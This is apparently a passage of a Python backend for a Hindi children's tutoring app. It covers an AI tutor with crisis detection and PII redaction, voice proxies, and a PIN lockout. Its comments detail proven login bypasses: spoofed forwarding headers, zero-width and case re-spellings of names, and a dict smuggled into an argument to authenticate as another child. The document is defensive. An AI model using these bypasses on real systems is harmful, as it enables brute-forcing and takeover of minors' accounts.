    "किताबी शब्द मत इस्तेमाल करो; छोटे-छोटे वाक्य। हमेशा हिम्मत देने वाले अंदाज़ में, "
    "जवाब छोटा रखो (2-4 वाक्य), फिर एक आसान सवाल पूछो। ग़लती पर डाँटो मत, प्यार से सही बताओ। "
    "सिर्फ़ पढ़ाई से जुड़ी बातें करो; कोई डरावनी, बड़ों वाली या ग़लत बात हो तो जवाब मत दो — "
    'कहो "ये बात किसी बड़े से पूछना, चलो कुछ मज़ेदार सीखते हैं!"। कभी फ़ोन नंबर, पता या '
    "निजी जानकारी मत माँगो। reasoning या सोच-विचार मत दिखाओ, सीधे हिंदी में जवाब दो।"
)
_DEFAULT_CRISIS_REPLY = (
    "यह बात किसी बड़े — अपनी टीचर या घर के किसी बड़े — से ज़रूर कहो, वे तुम्हारी मदद करेंगे। "
    "चलो, हम कुछ आसान और मज़ेदार सीखते हैं। 💛"
)
_PROMPT_VERSION = "mvp-1"

# Best-effort PII scrubbing BEFORE anything is persisted. Regex catches structured PII
# only — it will NOT catch a child naming a person/place in free text, so the stored
# transcript is "redacted on a best-effort basis", never guaranteed clean. (Design note.)
_RE_EMAIL = re.compile(r"\b[\w.+-]+@[\w-]+\.[\w.-]+\b")
_RE_AADHAAR = re.compile(r"\b\d{4}\s?\d{4}\s?\d{4}\b")
_RE_PHONE = re.compile(r"\b\d{10}\b")
_RE_URL = re.compile(r"https?://\S+")

# Deterministic crisis lexicon — runs BEFORE the model so a disclosure never reaches an
# open-ended generator and always yields the safe escalation path. Crude on purpose
# (high recall, accepts false positives); the always-on "Tell the teacher" button and a
# facilitator review of every flagged row are the real safety net, not this list.
_CRISIS_TERMS = (
    "suicide", "kill myself", "kill me", "end my life", "self harm", "khudkushi",
    "atmahatya", "marna chahti", "marna chahta", "jaan dena", "jaan de",
    "rape", "molest", "abuse", "beating me", "hits me", "marta hai", "marti hai",
    "chhua", "galat kaam", "gande", "blood",
    "आत्महत्या", "मरना चाहती", "मरना चाहता", "जान दे", "जान देना",
    "छेड़", "पीटता", "पीटती", "गंदा", "गंदी", "मारता", "मारती",
)


# (There used to be a second limiter, _rate_ok_strict, that duplicated _rate_ok with the
# opposite failure mode — and drifted from it, inheriting the same spoofable key and the
# same never-closing window. It is now _rate_ok(..., fail_closed=True): ONE implementation,
# with the open/closed choice stated at each call site.)


def _redact(text):
    """Scrub structured PII. Returns (clean_text, was_redacted). Best-effort only."""
    if not text:
        return "", False
    out = _RE_EMAIL.sub("[email]", text)
    out = _RE_AADHAAR.sub("[number]", out)
    out = _RE_PHONE.sub("[number]", out)
    return out, (out != text)


def _is_crisis(text):
    t = (text or "").lower()
    return any(term in t for term in _CRISIS_TERMS)


def _filter_output(text):
    """Last gate on what gets spoken to / stored for a child: strip URLs, emails and bare
    digit strings (phone/Aadhaar) from the model's reply. Best-effort, same as _redact."""
    out = _RE_URL.sub("", text or "")
    out = _RE_EMAIL.sub("", out)
    out = _RE_AADHAAR.sub("", out)
    out = _RE_PHONE.sub("", out)
    return out.strip()


def _log_ai_turn(student, sinfo, ctx, conversation_id, client_turn_id, prompt, reply,
                 model, was_canned, flagged, flag_reason, redacted, latency_ms):
    """Upsert the parent AI Conversation (by conversation_id) and insert one Turn.
    Best-effort — a logging failure must never break the child's answer."""
    try:
        conv = None
        if conversation_id:
            conv = frappe.db.get_value("AI Conversation", {"conversation_id": conversation_id}, "name")
        if conv:
            if flagged:
                frappe.db.set_value("AI Conversation", conv, {
                    "flagged": 1, "flag_reason": (flag_reason or "")[:140],
                    "escalated": 1 if flag_reason == "crisis" else 0,
                }, update_modified=False)
        else:
            try:
                conv = frappe.get_doc({
                    "doctype": "AI Conversation",
                    "conversation_id": conversation_id or frappe.generate_hash(length=24),
                    "student": student, "student_name": sinfo.get("student_name"),
                    "cohort": sinfo.get("cohort"),
                    "track": ctx["track"], "lesson": ctx["lesson"], "activity": ctx["activity"],
                    "lang": ctx["lang"], "model": (model or "")[:140],
                    "flagged": flagged, "flag_reason": (flag_reason or "")[:140],
                    "escalated": 1 if flag_reason == "crisis" else 0,
                    "started_on": frappe.utils.now(),
                }).insert(ignore_permissions=True).name
            except frappe.DuplicateEntryError:                # raced with another turn of the same convo
                frappe.db.rollback()
                conv = (frappe.db.get_value("AI Conversation", {"conversation_id": conversation_id}, "name")
                        if conversation_id else None)

        if not conv:   # degraded path — the turn would be an orphan, invisible to the review queue
            frappe.log_error("hikmat: AI turn has no parent conversation (orphan); flagged=" + str(flagged),
                             "hikmat ai_ask")

        if client_turn_id and frappe.db.get_value("AI Conversation Turn", {"client_turn_id": client_turn_id}, "name"):
            return conv                                       # idempotent: this turn already logged
        try:
            frappe.get_doc({
                "doctype": "AI Conversation Turn", "conversation": conv,
                "student": student, "cohort": sinfo.get("cohort"),
                "track": ctx["track"], "lesson": ctx["lesson"], "activity": ctx["activity"],
                # the child's doubt AND the model's reply are read by a facilitator in Desk; the
                # reply is generator output, i.e. steerable by the prompt, so it is not trusted
                "prompt": _plain_text(prompt)[:2000], "reply": _plain_text(reply)[:2000],
                "lang": ctx["lang"], "model_version": (model or "")[:140],
                "prompt_version": _PROMPT_VERSION, "latency_ms": _int(latency_ms),
                "was_canned": 1 if was_canned else 0, "redaction_applied": 1 if redacted else 0,
                "flagged": 1 if flagged else 0, "client_turn_id": client_turn_id or None,
                "created_on": frappe.utils.now(),
            }).insert(ignore_permissions=True)
        except frappe.DuplicateEntryError:
            frappe.db.rollback()
        frappe.db.commit()
        return conv
    except Exception:
        frappe.log_error("hikmat: ai turn logging failed", frappe.get_traceback())
        return None


@frappe.whitelist(allow_guest=True)
def ai_ask(student=None, token=None, track=None, lesson=None, activity=None,
           prompt=None, lang=None, conversation_id=None, client_turn_id=None):
    """Forward a child's doubt to the local Ollama tutor and return Roshni's Hindi reply.
    Requires a logged-in, consented student (guest free-text can't be consented or erased,
    so no anonymous AI). Everything is attacker-controllable → fail-closed, redact, cap."""
    if not _rate_ok("ai:ip:" + _client_ip(), 120, 3600, fail_closed=True):   # per-IP hourly ceiling
        return {"ok": False, "error": "rate_limited"}
    if not student:
        return {"ok": False, "error": "login_required"}
    sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _token_ok(student, token):
        return {"ok": False, "error": "auth"}
    if not _rate_ok("ai:stu:" + str(student), 40, 3600, fail_closed=True):   # per-student hourly cap
        return {"ok": False, "error": "rate_limited"}

    s = frappe.get_single("Hikmat Settings")
    if not s.get("ai_enabled"):
        return {"ok": False, "error": "ai_off"}

    # Her typed doubt and the context keys are persisted on AI Conversation / …Turn and read by
    # a facilitator in Desk, so they get the same ingest treatment as report_doubt.question.
    msg = _plain_text(prompt)[:2000]
    if not msg:
        return {"ok": False, "error": "empty"}

    ctx = {"track": _content_key(track), "lesson": _content_key(lesson),
           "activity": _content_key(activity), "lang": _content_key(lang, 10)}
    model = (s.get("ai_model") or "gemma4:12b-mlx").strip()

    red_msg, redacted = _redact(msg)

    # Crisis short-circuit — never calls the model; serves a safe canned reply + flags
    # the conversation for facilitator review. (Real-time escalation to the named
    # Safeguarding Lead is the next step, pending that person being named.)
    if _is_crisis(red_msg):
        reply = (s.get("ai_crisis_reply") or _DEFAULT_CRISIS_REPLY)
        logged = _log_ai_turn(student, sinfo, ctx, conversation_id, client_turn_id, red_msg, reply,
                              model=model, was_canned=1, flagged=1, flag_reason="crisis",
                              redacted=redacted, latency_ms=0)
        if not logged:   # safeguarding path must never fail silently — leave a distinct trail
            frappe.log_error("hikmat: CRISIS disclosure flag may NOT have persisted — check this; student="
                             + str(student), "hikmat ai_ask CRISIS")
        return {"ok": True, "reply": reply, "flagged": True}

    sys_prompt = (s.get("ai_system_prompt") or _DEFAULT_AI_PROMPT)
    endpoint = (s.get("ai_endpoint") or "http://localhost:11434").rstrip("/")

    import time
    import requests                                           # lazy import — only when AI is used
    t0 = time.monotonic()
    try:
        r = requests.post(endpoint + "/api/chat", json={
            "model": model, "stream": False,
            "messages": [{"role": "system", "content": sys_prompt},
                         {"role": "user", "content": red_msg}],
            "options": {"temperature": 0.6, "num_ctx": 4096, "num_predict": 160, "repeat_penalty": 1.1},
            "keep_alive": "30m",
        }, timeout=45)   # first call cold-loads the 6.8GB model (~slow); keep_alive holds it warm after
        latency_ms = int((time.monotonic() - t0) * 1000)
    except Exception:                                         # Ollama down / timeout → scripted fallback
        return {"ok": False, "error": "ai_unavailable"}
    if not r.ok:
        return {"ok": False, "error": "ai_unavailable"}
    try:
        reply = ((r.json().get("message") or {}).get("content") or "").strip()
    except Exception:
        reply = ""
    reply = _filter_output(reply)[:1200]
    if not reply:
        return {"ok": False, "error": "ai_unavailable"}

    _log_ai_turn(student, sinfo, ctx, conversation_id, client_turn_id, red_msg, reply,
                 model=model, was_canned=0, flagged=0, flag_reason="", redacted=redacted,
                 latency_ms=latency_ms)
    return {"ok": True, "reply": reply}


# ---------------------------------------------------------------------------
# Roshni VOICE — local Whisper (STT) + Piper (TTS), proxied through Frappe so the browser
# uses ONE same-origin gateway (no CORS) and both model daemons stay bound to 127.0.0.1,
# unreachable from the school LAN. Audio is forwarded, NEVER persisted — only the transcript
# is logged later via ai_ask (text-only privacy posture). ANE is broken on M4+macOS26, so
# Whisper runs on Metal and shares the GPU with the tutor LLM → callers MUST single-flight
# STT→LLM→TTS (enforced client-side). Piper is CPU-only, so TTS can overlap the LLM.
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def ai_transcribe(student=None, token=None, lang="hi"):
    """Forward a short captured WAV to the local whisper-server; return the transcript only.
    Requires a logged-in, consented student (same gate as ai_ask). Stores no audio."""
    if not _rate_ok("stt:ip:" + _client_ip(), 240, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    if not student:
        return {"ok": False, "error": "login_required"}
    sinfo = frappe.db.get_value("Student", student, ["active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _token_ok(student, token):
        return {"ok": False, "error": "auth"}
    if not _rate_ok("stt:stu:" + str(student), 80, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}

    s = frappe.get_single("Hikmat Settings")
    if not s.get("voice_enabled"):
        return {"ok": False, "error": "voice_off"}
    f = frappe.request.files.get("audio") if getattr(frappe, "request", None) else None
    if not f:
        return {"ok": False, "error": "no_audio"}
    audio = f.read()
    if not audio or len(audio) > 4 * 1024 * 1024:   # ~4MB cap — a short push-to-talk clip
        return {"ok": False, "error": "bad_audio"}
    endpoint = (s.get("stt_endpoint") or "http://127.0.0.1:8080").rstrip("/")

    import requests
    try:
        r = requests.post(endpoint + "/inference",
                          files={"file": ("clip.wav", audio, "audio/wav")},
                          data={"language": (lang or "hi")[:5], "response_format": "json", "temperature": "0"},
                          timeout=20)
    except Exception:
        return {"ok": False, "error": "stt_unavailable"}
    if not r.ok:
        return {"ok": False, "error": "stt_unavailable"}
    try:
        text = (r.json().get("text") or "").strip()
    except Exception:
        text = (r.text or "").strip()
    return {"ok": True, "text": text[:2000]}


@frappe.whitelist(allow_guest=True)
def ai_tts(student=None, token=None, text=None):
    """Synthesize a short Hindi line via the local Piper server; return WAV bytes. The client
    caches by text so each phrase is synthesized once. Login required (v1 routes only Roshni's
    replies through neural TTS; general app narration stays on the browser voice). Piper's voice
    is fixed at server launch (see tts_voice / the setup script), so only text is sent."""
    if not _rate_ok("tts:ip:" + _client_ip(), 600, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    if not student or not _token_ok(student, token):
        return {"ok": False, "error": "auth"}
    s = frappe.get_single("Hikmat Settings")
    if not s.get("voice_enabled"):
        return {"ok": False, "error": "voice_off"}
    msg = (text or "").strip()[:600]
    if not msg:
        return {"ok": False, "error": "empty"}
    endpoint = (s.get("tts_endpoint") or "http://127.0.0.1:5000").rstrip("/")

    import requests
    try:                                              # Piper http server: POST raw UTF-8 text → WAV
        r = requests.post(endpoint, data=msg.encode("utf-8"),
                          headers={"Content-Type": "text/plain; charset=utf-8"}, timeout=20)
    except Exception:
        return {"ok": False, "error": "tts_unavailable"}
    if not r.ok or not r.content:
        return {"ok": False, "error": "tts_unavailable"}
    frappe.response["type"] = "binary"
    frappe.response["filename"] = "roshni.wav"
    frappe.response["filecontent"] = r.content
    return


# ---------------------------------------------------------------------------
# Student login (facilitator-managed or self-signup; no email/password)
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def get_csrf():
    """The game is a static page, so it has no CSRF token — but when the browser
    carries a logged-in session (a facilitator with Desk open, or an online student
    after /api/method/login), Frappe REJECTS token-less POSTs (CSRFTokenError → 400).
    This GET hands the page its own session's token; same-origin policy keeps other
    sites from reading it. Guests get "" (their POSTs aren't CSRF-checked)."""
    if frappe.session and frappe.session.user and frappe.session.user != "Guest":
        return {"token": frappe.sessions.get_csrf_token()}
    return {"token": ""}


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_cohorts():
    """Every batch + the CENTRE it runs in. Staff only: this was the index that made
    get_students' per-cohort limit meaningless (guest → get_cohorts → get_students per
    cohort = the whole programme's roster of minors), and the list of centres where girls
    are taught is itself safeguarding-sensitive in Champaran."""
    _require_staff()
    return frappe.get_all("Cohort", fields=["name", "cohort_name", "center"],
                          order_by="cohort_name asc")


@frappe.whitelist(allow_guest=True)
def has_students():
    """Lightweight boot check — does any roster exist? Returns a bool only, never names
    (so the public boot path doesn't enumerate minors)."""
    return {"any": bool(frappe.db.count("Student", {"active": 1}))}


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_students(cohort=None):
    """Roster for ONE cohort: each active girl's first name + avatar. Never the PIN (only
    hasPin). Staff only.

    This was guest-facing until 2026-07-28, with a comment calling it a known-accepted
    exposure on the grounds that a campus laptop on a stale cached build would lose its
    login roster. That client does not exist: get_students / get_cohorts appear in NO
    caller anywhere — not index.html, not the two synced copies, not the Capacitor bundle
    (android-app/www + the merged release assets), not the .aab packet, not the Desk
    reports. It powered the OLD roster-picker login, which was replaced by typed name+PIN
    (login_by_name) for online learners and by the staff-gated get_campus_roster for
    campus devices. So there is nothing left to break, and the cost of leaving it open was
    that any anonymous caller could enumerate every minor in the programme by name.
    Deliberately NOT deleted: a facilitator tool may still want a roster read, and a gate
    that is present and greppable is easier to keep honest than a deleted endpoint someone
    re-adds without one."""
    _require_staff()
    if not cohort:
        return []
    rows = frappe.get_all("Student", filters={"active": 1, "cohort": cohort},
                          fields=["name", "student_name", "avatar", "login_pin"],
                          order_by="student_name asc")
    return [{"id": r.name, "name": r.student_name, "avatar": r.avatar or "🙂",
             "hasPin": bool(r.login_pin)} for r in rows]


# ---------------------------------------------------------------------------
# PIN LOCKOUT — brute-force protection for a 4-digit PIN.
#
# THE KEY IS THE WHOLE CONTROL. It must be something the attacker cannot vary while
# attacking the same girl, which means it must be PER-ACCOUNT, independent of network
# identity, AND CANONICAL IN EXACTLY THE WAY THE DATABASE'S OWN COMPARISON IS. Both halves
# have been broken here before, each time proven over HTTP in about a minute:
#   1. it used to include _client_ip() → 20 wrong PINs with 20 spoofed X-Forwarded-For
#      values never tripped the 8-try ceiling. (The IP was spoofable too — fixed separately
#      in _client_ip — but even a perfect IP is the wrong key: a phone tether changes it.)
#   2. it used to be BYTE-EXACT (sha256 of the typed name / the raw docname) while the DB
#      lookup that actually authenticates the girl is `utf8mb4_unicode_ci`. That collation
#      is case-insensitive AND gives every zero-weight character NO weight at all, so
#      RE-SPELLING the account name selected the same row under a DIFFERENT bucket, i.e. a
#      fresh 8-try + 50/day budget per spelling. Measured on this bench with WEIGHT_STRING()
#      — U+200B/200C/200D/200E/200F/2060/2061/2062/2063/FEFF/180E/202A–202E/034F all weigh
#      nothing, and so do the Devanagari marks U+0901/0902/0903/093C/0951–0954. Proven:
#      7 zero-width spellings x 7 wrong PINs = 49 guesses against ONE girl, never `locked`,
#      correct PIN still worked; and 12 case spellings of one docname = 84 guesses, never
#      `locked`, then login_student(DOCNAME.upper(), correct_pin) → {"ok": true}.
# The fix for (2) is _login_name_key / _login_id_account below: the bucket is keyed on the
# canonical account, and the row lookup is filtered on the SAME canonical value, so every
# spelling that can authenticate against a girl shares ONE budget by construction.
#
# WHAT "THE ACCOUNT" IS on each endpoint:
#   * login_student  → the Student docname AS THE DATABASE RESOLVED IT (not as the caller
#     spelled it). Unique, and an opaque hash (Student autoname is `hash`), so no PII.
#   * login_by_name  → the CANONICAL NAME she typed (_login_name_key). Names are NOT unique,
#     so this bucket is shared by every girl with that name. That is the honest key anyway:
#     the name is the only identifier the caller supplies, and it is exactly what an attacker
#     must hold fixed to attack one girl. The two endpoints therefore have separate budgets
#     (`id:` / `nm:`),
#     which is deliberate: coupling them would let an attacker who knows one girl's docname
#     lock every girl who shares her first name.
#   The name is HASHED into the bucket (not stored raw) for two reasons: a child's real name
#   should not sit in a Redis key that any ops shell or SLOWLOG can read, and it bounds the
#   key size so a flood of long invented names cannot bloat the cache.
#
# THE ABUSE TRADE-OFF, chosen deliberately: a per-account lockout means an attacker can
# deliberately lock a CHILD out of her own profile — a denial of service against a girl who
# did nothing wrong. That is the price of not letting her PIN be guessed, and it is priced
# down as far as it can be:
#   * generous budgets. 8 wrong PINs before a 5-minute cooldown (unchanged), and 50 wrong
#     PINs in 24h before the profile parks. A girl mistyping her own PIN two or three times
#     per session is nowhere near either number, and a SUCCESSFUL login clears both counters.
#   * the day budget is what actually kills brute force (50 guesses/day ≈ 200 days to cover
#     half a 4-digit space, versus ~2 days on the 5-minute counter alone) — and it is also
#     the DoS window, so it is bounded to 24h rather than indefinite.
#   * a facilitator can release it INSTANTLY: clear_login_lockout(student=…) / (name=…).
#   * a provisioned CAMPUS laptop never touches these endpoints at all — it verifies her PIN
#     on-device against the cached roster hash (pbkdf2Verify in index.html), so the girls
#     most likely to be targeted in a shared centre cannot be locked out of their lessons by
#     this at all. The lockout binds the online/typed-name path.
# Everything above degrades OPEN if Redis is unavailable (see _fail_count): a cache outage
# must not stop a girl logging in, and the PIN check itself still stands.
#
# The counters reuse the rate-limiter buckets (_rate_ok/_rate_state/_rate_reset) so there is
# ONE counting implementation in this file: atomic INCR, and a true fixed window that really
# closes instead of being re-armed by every new attempt.
# ---------------------------------------------------------------------------
_MAX_PIN_TRIES = 8              # wrong PINs before the short cooldown
_LOCKOUT_SECONDS = 300          # ...and how long that cooldown lasts
_MAX_PIN_TRIES_DAY = 50         # wrong PINs per account per day before the profile parks
_LOCKOUT_DAY_SECONDS = 86400
_MAX_PIN_FAILS_PER_IP = 600     # per-SOURCE spray ceiling; counts FAILED logins only, so a
_LOGIN_FAIL_IP_WINDOW = 3600    # room of girls logging in normally never touches it


def _login_name_key(val):
    """The CANONICAL form of a TYPED student name: one key for every spelling that is able to
    authenticate against the same row. This is the whole fix for the proven bypass in (2)
    above, and it is used for BOTH the lockout bucket and the SQL filter, so the two cannot
    drift apart again.

    What it does, and why each step:
      1. `_docname` — a whitelisted argument arrives as parsed JSON, so a dict/list/bool is
         REJECTED here rather than str()-ed into a junk key (and, historically, rather than
         reaching the ORM filter as an operator spec).
      2. the SIGNUP pipeline (`_display_name` = _plain_text + _no_formula_lead), so the key
         of a typed name is the key of the name signup would have STORED. This is also the
         fix for a lockout-OUT bug of the same family: signup collapses whitespace runs but
         login only end-stripped, so a girl who typed "Asha  Devi" at signup could never log
         in again. ONE normalisation on both sides fixes the bypass and that together.
      3. every Cf (format) character dropped — the zero-width joiners/marks, the BOM, the
         word joiner, the bidi controls. The DB cannot see these, so they must not be able to
         split a budget. Dropping ALL of Cf rather than only the zero-weight ones is
         deliberate: a key COARSER than the DB comparison can only merge spellings into one
         budget, never split one, and no invisible character belongs in a login key.
         (`_plain_text` deliberately KEEPS ZWJ/ZWNJ because they are real Devanagari spelling
         — that is right for text we store and replay, and wrong for a comparison key.)
      4. whitespace re-collapsed, because step 3 can leave two spaces adjacent.
      5. `casefold()`, because the comparison it guards is case-insensitive.
      6. NFC, chosen deliberately. The worry is that adding a normalisation MariaDB does not
         perform would put this key out of step with the SQL filter — but measured here,
         MariaDB gives the nukta U+093C zero weight, so it ALREADY treats 'ड़' spelled U+095C
         and spelled U+0921 U+093C as one string. NFC therefore cannot make this key finer
         than the SQL filter; all it does is unify two byte-spellings of the SAME character
         (and canonically reorder marks), which lets a girl log in from a device whose IME
         composes differently from the one she signed up on. NFKC is NOT used: it rewrites
         characters and would corrupt real names.

    What it deliberately does NOT fold: COMBINING MARKS. utf8mb4_unicode_ci compares at
    primary strength and gives U+0901 candrabindu, U+0902 anusvara, U+0903 visarga, U+093C
    nukta and U+0951–0954 zero weight, so to the DB 'अंजू' == 'अजू' == 'अजूं'. Folding those in
    would merge two DIFFERENT girls' names, which is precisely what must not happen to a
    Hindi roster. They are handled the other way round instead: the endpoint re-checks this
    key against every candidate row IN PYTHON (see _login_name_candidates), so a mark-only
    difference no longer authenticates at all. That removes it as a re-spelling axis AND
    closes a separate flaw proven over HTTP on the way in — Anju typing her own name 'अंजू'
    was logged in as a DIFFERENT girl, 'अजू', and handed that girl's token."""
    s = _display_name(_docname(val, 140), 140)   # scalars only, then exactly what signup stores
    s = "".join(ch for ch in s if unicodedata.category(ch) != "Cf")
    return unicodedata.normalize("NFC", " ".join(s.split()).casefold())


def _login_account_key(kind, value):
    """Bucket suffix for one account. `kind` is "id" (a Student docname) or "nm" (a typed
    name, hashed — see the note above).

    `value` MUST already be CANONICAL: the docname the DB resolved to (see
    _login_id_account) for "id", `_login_name_key(...)` for "nm". Passing the caller's own
    spelling here is the bypass this module has already been broken by twice."""
    value = str(value or "")
    if kind == "nm":
        value = hashlib.sha256(value.encode("utf-8")).hexdigest()[:20]
    return kind + ":" + value


def _login_id_account(student, canon=None):
    """The bucket for the `id` login form, keyed on the CANONICAL docname.

    `tabStudent.name` is utf8mb4_unicode_ci as well, so 'UCESG77D8G' and 'ucesg77d8g' select
    the SAME row — proven: 84 wrong PINs across 12 case spellings of one docname never
    tripped the 8-try ceiling, and login_student(docname.upper(), correct_pin) then returned
    ok. So the key has to be the name the DATABASE resolved to, never the one typed.

    `canon` is that resolved docname. When the row does NOT exist we still return a bucket
    (keyed on the canonicalised argument) rather than skipping the lockout, so an unknown id
    locks after the same 8 tries as a real one: an attacker must not be able to tell an
    invented Student id from a real one by watching whether a lockout ever appears. The
    unknown key is HASHED for the same two reasons a name is — an invented id is
    attacker-controlled text up to the Link width, and it must not bloat the cache keyspace
    — and prefixed "?" so an operator reading Redis can see it resolved to nobody."""
    if canon:
        return _login_account_key("id", canon)
    return _login_account_key(
        "id", "?" + hashlib.sha256(_login_name_key(student).encode("utf-8")).hexdigest()[:20])


def _login_buckets(account):
    """The two per-account failure buckets: (short cooldown, 24h budget)."""
    return ("loginfail:" + account, "loginfail-day:" + account)


def _fail_count(bucket):
    """Current count in a failure bucket, 0 if the limiter cannot be read. Fail-OPEN on an
    outage is the same availability call the rest of the app makes (see _rate_ok): a Redis
    hiccup must not lock a classroom out of its own profiles, and the PIN still has to match."""
    try:
        return _rate_state(bucket)[0]
    except Exception as e:
        _rl_warn(bucket, e, False)
        return 0


def _login_ip_bucket():
    """The per-SOURCE failure bucket, or None when there is no identifiable source.

    _client_ip() answers "unknown" outside a request (scheduler, `bench execute`, a
    facilitator script). Throttling that is meaningless — it is one bucket for every
    context at once — and it could let an offline bulk job refuse real logins, so those
    calls simply carry no source ceiling. The per-account budget still applies."""
    ip = _client_ip()
    return ("loginfail-ip:" + ip) if ip and ip != "unknown" else None


def _login_blocked(account):
    """True when this account has spent its wrong-PIN budget, or this SOURCE has sprayed too
    many failures. Checked before the PIN is verified, so a locked account costs no pbkdf2.

    The per-source half is a spray throttle, NOT the authoritative control (that is the
    account, which no attacker can vary). It is set generously — 600 failures/hour is ~2× the
    worst hour of a large centre where every girl mistypes several times — because a whole
    classroom shares one public IP, and a facilitator can clear it with
    clear_login_lockout(ip=…) if a shared address is ever caught in it."""
    short_b, day_b = _login_buckets(account)
    if _fail_count(short_b) >= _MAX_PIN_TRIES or _fail_count(day_b) >= _MAX_PIN_TRIES_DAY:
        return True
    ip_b = _login_ip_bucket()
    return bool(ip_b) and _fail_count(ip_b) >= _MAX_PIN_FAILS_PER_IP


def _login_failed(account):
    """Count one wrong PIN: against the account (both windows) and against the source IP.
    Only FAILURES are counted, so a legitimate login never consumes budget."""
    short_b, day_b = _login_buckets(account)
    _rate_ok(short_b, _MAX_PIN_TRIES, _LOCKOUT_SECONDS)
    _rate_ok(day_b, _MAX_PIN_TRIES_DAY, _LOCKOUT_DAY_SECONDS)
    ip_b = _login_ip_bucket()
    if ip_b:
        _rate_ok(ip_b, _MAX_PIN_FAILS_PER_IP, _LOGIN_FAIL_IP_WINDOW)


def _login_succeeded(account):
    """A correct PIN clears the account's budget — the girl who mistyped four times and then
    got it right starts clean, and an attacker gains nothing (they had to know the PIN)."""
    for b in _login_buckets(account):
        try:
            _rate_reset(b)
        except Exception as e:                 # a cache outage must not fail a good login
            _rl_warn(b, e, False)


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def clear_login_lockout(student=None, name=None, ip=None):
    """Let a locked-out girl back in NOW. This is the release valve that makes a per-account
    lockout acceptable: without it, an attacker burning another child's wrong-PIN budget would
    keep her out for up to 24h with nobody able to help.

    Pass `student` (docname — clears her id buckets AND the name buckets for her
    student_name, because she may have been locked on either screen), `name` (the typed
    name — clears that name's buckets), and/or `ip` (the per-source spray counter, for the
    rare case a whole shared classroom IP is blocked). Reports the counts it found so a
    facilitator can tell a real lockout from a girl who is simply mistyping her PIN.

    BOTH forms go through the same canonicalisation the login endpoints use, so whatever
    spelling the facilitator happens to type releases the bucket that is actually held: the
    docname in any case, and a name with the wrong case, a stray zero-width character or a
    double space in it. A release valve that only worked for one spelling of the name would
    be no valve at all — it is what makes a per-account lockout tolerable."""
    _require_staff()
    student, name, ip = _docname(student), _docname(name), _norm_ip(ip)
    targets = []
    if student:
        row = frappe.db.get_value("Student", student, ["name", "student_name"], as_dict=True)
        targets.append(_login_id_account(student, row.name if row else None))
        if row and row.student_name:
            targets.append(_login_account_key("nm", _login_name_key(row.student_name)))
    if name:
        key = _login_name_key(name)
        if key:                                  # a name of nothing but markup/format chars
            targets.append(_login_account_key("nm", key))
    targets = list(dict.fromkeys(targets))       # she may be reachable by both routes
    if not (targets or ip):
        return {"ok": False, "error": "no_target"}
    out = {}
    for acct in targets:
        short_b, day_b = _login_buckets(acct)
        recent, today = _fail_count(short_b), _fail_count(day_b)
        # account-only verdict: _login_blocked() also consults the CALLER's source counter,
        # which would answer about the facilitator's own IP, not about this girl.
        out[acct] = {"recent_fails": recent, "fails_today": today,
                     "was_locked": recent >= _MAX_PIN_TRIES or today >= _MAX_PIN_TRIES_DAY}
        _login_succeeded(acct)
    if ip:
        b = "loginfail-ip:" + ip
        out[b] = {"fails_this_hour": _fail_count(b)}
        try:
            _rate_reset(b)
        except Exception as e:
            _rl_warn(b, e, False)
    return {"ok": True, "cleared": out}


@frappe.whitelist(allow_guest=True)
def login_student(student, pin=None):
    """Verify a student's PIN with a per-account lockout (8 wrong tries → 5-min cooldown, and
    50/day → the profile parks; see the PIN LOCKOUT note above), defeating brute force of
    short numeric PINs. Constant-time compare.

    `student` MUST be coerced to a scalar document name (see _docname) before anything
    else. Without it this guest-facing endpoint was an ORM filter: the caller could name
    NO ONE — login_student({"login_pin": "1234"}) authenticated against whichever row the
    filter happened to select, returned that girl's name (attribute-enumeration of minors),
    and then rotated the token of EVERY matched row to one shared value via _token_for.
    The lockout was defeated at the same time, because its cache key was str(student):
    two spellings of one filter are two buckets, so the 8-try ceiling never closed.

    _docname is necessary but was NOT sufficient: `tabStudent.name` is utf8mb4_unicode_ci, so
    re-CASING a real docname still selected her row while keying a brand-new bucket (84
    guesses proven, then the correct PIN worked). The row is therefore resolved to its
    canonical name BEFORE the lockout is consulted, and everything downstream — the bucket,
    the PIN upgrade, the token, the id handed back to the device — uses that canonical name
    rather than the caller's spelling."""
    student = _docname(student)
    if not student:
        return {"ok": False, "error": "not_found"}      # same answer as a wrong id: no oracle
    # ONE indexed read, before the lockout check, purely to canonicalise the account. A
    # blocked account still costs no pbkdf2, which is what that ordering was protecting.
    s = frappe.db.get_value("Student", student,
                            ["name", "student_name", "login_pin", "active", "avatar", "band"],
                            as_dict=True)
    acct = _login_id_account(student, s.name if s else None)   # per-ACCOUNT, never per-IP
    if _login_blocked(acct):
        return {"ok": False, "error": "locked"}
    if not s or not s.active:
        # Counted, so an unknown id parks after the same 8 tries as a real one: the presence
        # or absence of a lockout must not answer "is this a real Student id?".
        _login_failed(acct)
        return {"ok": False, "error": "not_found"}
    student = s.name                                    # canonical from here on, never the typed spelling
    if not s.login_pin:                                 # PIN-less profile → un-loginnable; facilitator sets one in Desk
        return {"ok": False, "error": "no_pin"}         # not counted: there is no secret to guess
    if not _pin_ok(s.login_pin, pin):
        _login_failed(acct)
        return {"ok": False, "error": "wrong_pin"}
    _login_succeeded(acct)                              # reset the counters on success
    if not _looks_hashed(s.login_pin):                  # upgrade a legacy plaintext PIN to a hash on login
        frappe.db.set_value("Student", student, "login_pin", _hash_pin(str(s.login_pin)), update_modified=False)
    token = _token_for(student)
    frappe.db.commit()
    return {"ok": True, "id": student, "name": s.student_name, "avatar": s.avatar or "🙂", "token": token}


@frappe.whitelist(allow_guest=True)
def signup_student(name=None, avatar=None, pin=None, age=None, cohort=None, band=None):
    """Self-service signup: a learner creates their own profile and is logged straight in.
    No email/password — just a name (+ optional avatar, PIN, grade band). Rate-limited per IP."""
